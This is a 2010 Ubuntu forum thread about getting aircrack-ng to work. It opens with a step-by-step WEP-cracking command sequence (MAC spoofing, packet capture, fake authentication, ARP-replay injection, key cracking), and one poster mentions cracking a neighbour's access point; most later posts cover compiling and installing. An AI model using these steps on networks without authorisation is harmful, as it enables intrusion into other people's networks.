---
title: "airmon-ng ubuntu 10.10"
date: 2010-12-23
forum: Networking &amp; Wireless
---

### Post by abraves247 on 2010-12-23
I have been using airmon-ng on Ubuntu 10.10 
I have used the compat wireless patch but I haven't got any further
these are the commands I am using.



1. Sudo airmon-ng stop wlan0

2. Sudo ifconfig wlan0 down
3. Sudo macchanger –-mac 00:11:22:33:44:55 wlan0

4. Sudo airmon–ng start wlan0 
5. Sudo airodump-ng wlan0
6. Sudo airodump-ng –c (copy channel) –w ( filename) –-bssid (bssid)
7. Sudo aireplay-ng -1 0 –a (bssid) –h (fake mac address) mon0 
8. Sudo aireplay-ng -3 –b (bssid) –h (fake mac address) wlan0
9. Aircrack-ng –b (bssid) (filename-01.cap)

when I type in Sudo aireplay-ng -1 0 –a (bssid) –h (fake mac address) mon0 I get the following output

12:32:07  Sending Authentication Request (Open System) 

12:32:10  Sending Authentication Request (Open System) 
Attack was unsuccessful. Possible reasons: 

    * Perhaps MAC address filtering is enabled. 
    * Check that the BSSID (-a option) is correct. 
    * Try to change the number of packets (-o option). 
    * The driver/card doesn't support injection. 
    * This attack sometimes fails against some APs. 
    * The card is not on the same channel as the AP. 
    * You're too far from the AP. Get closer, or lower 
      the transmit rate. 

I have tried several times to get this to work. Any help would be great thanks.

---

### Post by spiky001 on 2010-12-23
Have you made sure the wireless is in monitor mode and test it can inject? [http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack)

---

### Post by ctops.legal on 2010-12-30
[FONT=Lucida Sans Unicode][SIZE=3]Ok I just spent 4 solid days trying Ubuntu v10.10 both versions, my sole purpose is to find a better operating system just for cracking wifi, I own a legit business and have to do this all the time, BT3 or BT4 are not as good as aircrack-ng-1.1, sudo apt-get aircrack-ng gives you an old version, I used sudo chmod 777 -R /path/to/someDirectory-with aircrack-ng[/SIZE][/FONT]
[FONT=Lucida Sans Unicode][SIZE=3]"read/write pernissions keep users from dragging in good word.lst files for WPA which is the standard WEP is a joke, I have always used the Alfa awus036h I just got a new one same rtl8187 chip, to be honest after I got it working I was able to get 2 or 3 AP, running under VMware on win7 aircrack gets about 10.[/SIZE][/FONT]
 
[FONT=Lucida Sans Unicode][SIZE=3]There is an issue to blacklist and compile patched drivers to get max preformance from the Alfa awus036h tried for days Ubuntu 10.10 just wont work (I am proficient with Linux) , I don't need all the media crap is there, is there a better Ubunto version for my needs. ):P[/SIZE][/FONT]
[FONT=Lucida Sans Unicode][SIZE=3][/SIZE][/FONT] 
[FONT=Lucida Sans Unicode][SIZE=3]Why--> [IMG]http://img254.imageshack.us/img254/103/aircrack1.jpg[/IMG]
By [ctops](http://profile.imageshack.us/user/ctops) at 2010-12-30[/SIZE][/FONT]

---

### Post by ctops.legal on 2010-12-30
> **spiky001 said:**
> Have you made sure the wireless is in monitor mode and test it can inject? [http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack)
 
Yea of course there is a WEP ap next door high power easy to crack it will do that it's a weak process, running sudo airodump-ng mon0 which is an sub interface "mon0" instead of my actual interface which in my /sys. is wlan1, it's a no brainer. I installed Ubuntu v10.4 and I want to run aircrack-ng-1.1 in my /user/root, can't cd to that, the whole root/ must be configured with sticky bit. Need to find how to cd aircrack-ng from my HOME directory :confused:

---

### Post by ctops.legal on 2010-12-30
My screen caps;
 
[http://ubuntuforums.org/album.php?albumid=2170](http://ubuntuforums.org/album.php?albumid=2170)
 
There will be more before I solve this problem :popcorn:

---

### Post by PatchesTheCaveman on 2010-12-30
If you're getting permissions errors you can get a root shell by running:
```
sudo su
```
But be careful cause you'll have permission to do everything.

Also, you might be able to get more help specifically with aircrack-ng from the people on the aircrack-ng forum:
[http://forum.aircrack-ng.org/](http://forum.aircrack-ng.org/)

---

### Post by ctops.legal on 2010-12-31
> **PatchesTheCaveman said:**
> If you're getting permissions errors you can get a root shell by running:
```
sudo su
```
But be careful cause you'll have permission to do everything.
 
Also, you might be able to get more help specifically with aircrack-ng from the people on the aircrack-ng forum:
[http://forum.aircrack-ng.org/](http://forum.aircrack-ng.org/)
 
Trust me I have, bottom line I don't think Ubuntu can cd aircrack-ng-1.1 from the area I want, extract the new version of aircrack-ng-1.1, drag the folder to home ~~ HOME then try and cd that folder aircrack-ng wont execute, Ubuntu has to run from all them sub-directories, you should be able to run your interface as 'wlan0' NOT mon0 , usb data rate under mon0 is very low, I was reading about a usb patch just for that and other issues. :guitar:

---

### Post by PatchesTheCaveman on 2010-12-31
If you want to install aircrack-ng into a different directory, edit the common.mak file in the source directory before you compile it and change this line at the bottom:
```
prefix = /usr/local
```
to the directory you want it in, e.g.
```
prefix = /home/ctops.legal/aircrack-ng
```

Make sure you create that directory first before you *make install*.

---

### Post by ctops.legal on 2010-12-31
> **PatchesTheCaveman said:**
> If you want to install aircrack-ng into a different directory, edit the common.mak file in the source directory before you compile it and change this line at the bottom:
```
prefix = /usr/local
```
to the directory you want it in, e.g.
```
prefix = /home/ctops.legal/aircrack-ng
```
 
Make sure you create that directory first before you *make install*.
 
[SIZE=2]Well here is my source;[/SIZE]
[SIZE=2][/SIZE] 
wget [http://download.aircrack-ng.org/aircrack-ng-1.1.tar.gz](http://download.aircrack-ng.org/aircrack-ng-1.1.tar.gz)
 tar -zxvf aircrack-ng-1.1.tar.gz
 cd aircrack-ng-1.1
 make
 make install
 
This version of aircrack-ng-1.1 can't  run from a made directory I did that first, I will keep trying. :mad:

---

### Post by PatchesTheCaveman on 2010-12-31
Before you run make, run ```
nano common.mk
``` and make the changes I described in my previous post.  Press CTRL+X to exit and press *y* to save.  When you run ```
make
``` and ```
make install
``` again it will install it into the directory you set in common.mk.

---

### Post by deviant01 on 2011-01-01
everytime i get a new notebook, i just use synaptic to grab aircrack... no mucking about in the terminal with installs... everything always works dandy... tried that yet?

---

### Post by ctops.legal on 2011-01-01
> **deviant01 said:**
> everytime i get a new notebook, i just use synaptic to grab aircrack... no mucking about in the terminal with installs... everything always works dandy... tried that yet?
 
**synaptic** installs old versions of the **aircrack**-**ng** / airoscript-ng. :confused:

---

### Post by deviant01 on 2011-01-01
boooo... my bad... any major differences after all you are just auditing your own network right?

---

### Post by deviant01 on 2011-01-01
well neverminf the differences i just updated mine to 1.1 :D eeeehaw

---

### Post by ctops.legal on 2011-01-01
[SIZE=3]Ok I got the new version of aircrack to run with " cd /home/oasis/aircrack-ng-1.1[/SIZE]
 
[SIZE=3]tried to run airmon-ng I got a message "The program 'airmon-ng' is currently not installed. You can install it by typing: sudo apt-get install aircrack-ng[/SIZE]
 
[SIZE=3]I have been through this before it installs in the usr/doc/ directory (with the old version of aircrack, question why must Ubuntu run airmon-ng as a different app. ?, I need to be able to run it from the directory oasis@0:~/aircrack-ng-1.1$[/SIZE]
 
[SIZE=3]that's where I am at now same as before I just did it a different way, and macchanger wont run from the same ?????[/SIZE]

---

### Post by graben3 on 2011-01-17
Use ./ to specify you want to use the prog in the cur directory ?
Are your progs in exec mode ?

cd /home/oasis/aircrack-ng-1.1
./aqircrack-ng *.cap

---

### Post by graben3 on 2011-01-17
Use ./ to specify you want to use the prog in the cur directory ?
Are your progs in exec mode ?

cd /home/oasis/aircrack-ng-1.1
./aircrack-ng *.cap

---

